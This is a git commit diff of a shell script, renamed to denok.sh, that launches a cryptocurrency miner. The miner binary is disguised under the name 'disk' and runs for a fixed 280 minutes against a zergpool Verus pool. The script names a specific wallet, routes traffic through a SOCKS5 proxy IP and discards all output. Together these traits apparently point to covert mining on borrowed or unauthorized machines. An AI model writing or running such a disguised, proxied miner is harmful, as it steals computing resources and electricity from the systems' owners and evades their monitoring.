091fe7a25a5a18972f4bc7b4f48c160182b95790
hermandenok <88980940+hermandenok@users.noreply.github.com>
2021-08-15 23:41:08 +0700

    Update and rename right.sh to denok.sh

--- denok.sh
+++ denok.sh
@@ -6,6 +6,6 @@ screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DTPPTaZiWfd9RHqzmU5sXNke5nQF8QbENr
 PROXY=socks5://192.252.209.155:14455
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-PRANKENSTAINT)
+WORKER=$(echo $(shuf -i 100-999 -n 1)-HERMAN-DENOK)
 timeout 280m ./disk -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
 echo Sukses
